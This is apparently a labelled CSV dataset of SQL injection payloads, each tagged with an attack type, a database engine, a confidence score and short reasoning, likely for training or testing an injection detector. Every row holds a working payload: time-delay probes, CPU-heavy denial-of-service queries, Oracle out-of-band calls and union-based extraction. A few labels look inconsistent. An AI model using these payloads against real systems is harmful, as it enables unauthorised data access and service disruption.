id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20978,"1%"" ) ) and 9198 = 9198--",boolean_blind,generic,0.5,"and 9198 = 9198 = generic equality without specific attack markers.",0
20979,"1, ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",boolean_blind,postgresql,0.7,"cast(...as numeric) with ::text = PostgreSQL type casting for boolean condition manipulation.",1
20980,"1'|| ( select 'uvbb' where 7795 = 7795 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",heavy_query,generic,0.65,"repeat(left(...,500000000)) = CPU-heavy payload. Heavy query attack pattern.",0
20981,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'ksoc' = 'ksoc,time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",2
20982,select ( case when ( 1005 = 5996 ) then 1 else 1005* ( select 1005 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.7,"master..sysdatabases = MSSQL metadata reference. case when with subquery select = MSSQL boolean-blind.",2
20983,"-9272%"" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""%"" = """,out_of_band,oracle,0.85,"utl_inaddr.get_host_address() = Oracle out-of-band/error-based. Network function for data exfiltration.",2
20984,1'+ ( select rdwb where 2498 = 2498 and 3429 = 7639--,boolean_blind,generic,0.5,"and 3429 = 7639 = generic inequality. Minimal attack context.",1
20985,-9191' ) as qtvm where 2838 = 2838 or ( 8459 = 8459 ) *4906--,boolean_blind,generic,0.5,"or ( 8459 = 8459 ) = boolean equality without clear SQLi markers.",0
20986,select ( case when ( 4935 = 4734 ) then 4935 else 4935* ( select 4935 from mysql.db ) end ) #,boolean_blind,mysql,0.7,"mysql.db reference with case when = MySQL-specific boolean-blind SQLi.",2
20987,"-9840 ) ) as thod where 4790 = 4790 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,mssql,0.75,"convert(int,...) with char() = MSSQL boolean-blind type casting attack.",1
20988,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",heavy_query,generic,0.65,"repeat(...,500000000) = CPU-intensive heavy query (DoS pattern).",0
20989,"1 ) ) as hgtl where 3864 = 3864 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.7,"elt() priority(P3) > sleep(P5). elt() with boolean condition = MySQL boolean-blind SQLi.",2
20990,"1%"" ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,out_of_band,oracle,0.8,"ctxsys.drithsx.sn() = Oracle OOB/error-based function.",1
20991,"1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""fbol"" like ""fbol",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query (DoS).",0
20992,"1 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # eahg",error_based,mysql,0.65,"exp(~...) = MySQL bitwise NOT exp() error function for error-based SQLi.",1
20993,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",union_based,generic,0.8,"'union all select' = union-based SQLi injection.",2
20994,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'zpkv' = 'zpkv",error_based,mysql,0.85,"updatexml() = MySQL XPath injection error-based SQLi. Nested elt() in concat().",2
20995,"1 ) where 6954 = 6954 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query payload.",0
20996,"1'|| ( select 'osty' from dual where 6433 = 6433 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",heavy_query,oracle,0.7,"all_users cartesian join (t1-t5) = Oracle heavy query with boolean context.",1
20997,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'hqcz' = 'hqcz,boolean_blind,mysql,0.7,"rlike(select sleep()) = MySQL boolean-blind using RLIKE regex function.",2
20998,"1"" ) as ivkw where 4218 = 4218 union all select null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
20999,1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'gjja' = 'gjja,time_blind,postgresql,0.9,"pg_sleep() = PostgreSQL time-based blind SQLi.",2
21000,"1"" ) where 2088 = 2088 union all select null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21001,"-2230%"" union all select 3303,3303,3303--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21002,"1"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,"all_users cartesian join (t1-t5) = Oracle heavy query attack.",1
21003,"-4418"" or 6872 = 6872 and ""gbut"" = ""gbut",boolean_blind,generic,0.5,"or 6872 = 6872 = generic boolean without SQLi markers.",1
21004,select sleep ( 5 ) and ( ( 'wyvx' = 'wyvx,time_blind,mysql,0.9,"sleep() function = MySQL time-based blind SQLi.",3
21005,"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21006,1'|| ( select 'brde' where 7390 = 7390 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',out_of_band,oracle,0.85,"utl_inaddr.get_host_address() = Oracle out-of-band SQLi.",2
21007,"1%"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""%"" = """,heavy_query,oracle,0.7,"all_users cartesian join (t1-t5) = Oracle heavy query.",1
21008,1' where 9242 = 9242,benign,generic,0.5,"where 9242 = 9242 = static condition without SQLi context.",0
21009,"-6041' ) ) or make_set ( 9835 = 1367,1367 ) and ( ( 'hxjf' = 'hxjf",boolean_blind,mysql,0.7,"make_set() = MySQL boolean-blind function.",2
21010,"1"" ) as jask where 7629 = 7629 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
21011,"-5235 ) or make_set ( 9354 = 9354,7185 )",boolean_blind,mysql,0.7,"make_set() = MySQL boolean-blind function.",0
21012,"-9820"" or 1038 = 7502#",boolean_blind,generic,0.5,"or 1038 = 7502 = generic inequality without SQLi markers.",1
21013,"1 ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 9462 = 9462",heavy_query,oracle,0.7,"all_users cartesian join (t1-t5) = Oracle heavy query.",0
21014,"1'+ ( select 'usoq' where 7783 = 7783 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",error_based,mysql,0.85,"updatexml() = MySQL error-based SQLi with XPath injection.",1
21015,"1"" ) and 7533 = 7533 and ( ""jfsw"" like ""jfsw",boolean_blind,generic,0.5,"and 7533 = 7533 = generic boolean without SQLi markers.",1
21016,"1%' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",heavy_query,postgresql,0.75,"generate_series(1,5000000) = PostgreSQL heavy query (DoS pattern).",2
21017,-5852 ) as anca where 3574 = 3574 or 3958 = 5536#,boolean_blind,generic,0.5,"or 3958 = 5536 = generic inequality.",0
21018,"( select 1 from generate_series ( 8515,8515,case when ( 8515 = 3477 ) then 1 else 0 end ) limit 1 )",boolean_blind,postgresql,0.7,"generate_series(...case when...) = PostgreSQL boolean-blind.",1
21019,"1%"" ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,mssql,0.7,"sysusers cartesian join (sys1-sys7) = MSSQL heavy query with boolean context.",1
21020,"-2840' ) ) ) union all select 3025,3025,3025,3025--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21021,select case when 5346 = 8272 then 1 else null end--,benign,generic,0.5,"case when...then...else...end = conditional without clear SQLi context.",0
21022,"select sleep ( 5 ) and ""oivc"" like ""oivc",time_blind,mysql,0.9,"sleep() = MySQL time-based blind SQLi.",2
21023,"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21024,1 ) as eryo where 2531 = 2531 rlike sleep ( 5 ) --,time_blind,mysql,0.75,"sleep() with rlike = MySQL time-based blind (rlike secondary).",2
21025,"-2912"" ) as eizh where 2223 = 2223 or make_set ( 1041 = 3056,3056 ) --",boolean_blind,mysql,0.7,"make_set() = MySQL boolean-blind function.",0
21026,"1'|| ( select 'skds' from dual where 8594 = 8594 and make_set ( 6779 = 2027,2027 ) ) ||'",boolean_blind,mysql,0.7,"make_set() function but dual indicates Oracle. Conservative: generic boolean-blind.",0
21027,"1%' union all select null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21028,"1"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.7,"repeat(...,5000000000) = CPU-intensive heavy query (DoS).",0
21029,1' ) as imgv where 7802 = 7802,benign,generic,0.5,"where 7802 = 7802 = static condition without SQLi markers.",0
21030,1'+ ( select 'vidl' where 9445 = 9445 and 5498 = 5777#,boolean_blind,generic,0.5,"and 5498 = 5777 = generic inequality.",0
21031,"1 ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4277 = 4277",heavy_query,postgresql,0.8,"generate_series(1,5000000) = PostgreSQL heavy query.",2
21032,"1%' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and '%' = '",boolean_blind,mysql,0.7,"elt() with GROUP BY = MySQL boolean-blind SQLi.",1
21033,"1%' union all select null,null,null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21034,"-4072%"" ) ) ) or 3999 = 1979",boolean_blind,generic,0.5,"or 3999 = 1979 = generic inequality.",0
21035,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21036,"1"" and sleep ( 5 ) #",time_blind,mysql,0.9,"sleep() = MySQL time-based blind SQLi.",2
21037,"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""kpwc"" like ""kpwc",heavy_query,oracle,0.7,"all_users cartesian join = Oracle heavy query with boolean context.",0
21038,"-4728"" ) ) as ndri where 3278 = 3278 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,mysql,0.7,"make_set() = MySQL boolean-blind function.",0
21039,"1"" ) as obbk where 6414 = 6414 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.7,"elt() with GROUP BY aggregate = MySQL boolean-blind SQLi.",1
21040,"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""ppml"" = ""ppml",time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
21041,"1"" ) as zbhs where 2017 = 2017 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.7,"elt() in GROUP BY = MySQL boolean-blind SQLi.",1
21042,"-1106' ) ) union all select 2855,2855,2855,2855,2855,2855,2855#",union_based,generic,0.85,"'union all select' = union-based SQLi. Rule + heuristic agree.",3
21043,"waitfor delay '0:0:5' and ( ( ""zili"" like ""zili",time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
21044,"1%' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( '%' = '",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive DoS query.",1
21045,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""ljkg"" = ""ljkg",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
21046,"1%"" union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21047,1' in boolean mode ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
21048,"1%"" ) ) ) union all select null,null,null,null,null#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21049,"-8888%' ) union all select 5312,5312,5312,5312,5312,5312,5312,5312--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21050,"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""dnlz"" = ""dnlz",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
21051,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'stea' = 'stea,time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
21052,"-1490'|| ( select 'uzbm' from dual where 3181 = 3181 union all select 3181,3181,3181,3181,3181--",union_based,oracle,0.85,"'union all select' with dual = Oracle union-based SQLi.",2
21053,"1"" ) where 5794 = 5794 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21054,"-5891 ) where 5792 = 5792 union all select 5792,5792,5792,5792,5792#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21055,"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""%"" = """,time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
21056,1'|| ( select 'xglm' from dual where 3556 = 3556 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,oracle,0.85,"pg_sleep() detected but dual suggests Oracle. Conservative: time_blind with oracle DB.",0
21057,"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",time_blind,mysql,0.85,"sleep() = MySQL time-based blind SQLi.",2
21058,"-7544"" ) ) union all select 3808,3808,3808,3808--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21059,"-7032' ) as xmmm where 5635 = 5635 union all select 5635,5635,5635,5635,5635--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21060,waitfor delay '0:0:5' and ( ( ( 'hrta' = 'hrta,time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
21061,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'lgat' like 'lgat",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi with XPath injection.",1
21062,"1"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,"pg_sleep() = PostgreSQL time-based blind SQLi.",2
21063,"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21064,"1"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""ponv"" = ""ponv",boolean_blind,mysql,0.7,"elt() with GROUP BY = MySQL boolean-blind SQLi.",1
21065,"1 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21066,"1"" ) union all select null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21067,"1' ) union all select null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21068,-2733' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'btjx' = 'btjx,error_based,oracle,0.85,"xmltype() = Oracle error-based SQLi with XML cast error.",1
21069,"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
21070,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
21071,"1 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21072,"1'+ ( select lang where 4191 = 4191 union all select null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21073,1%' ) ) union all select null--,union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
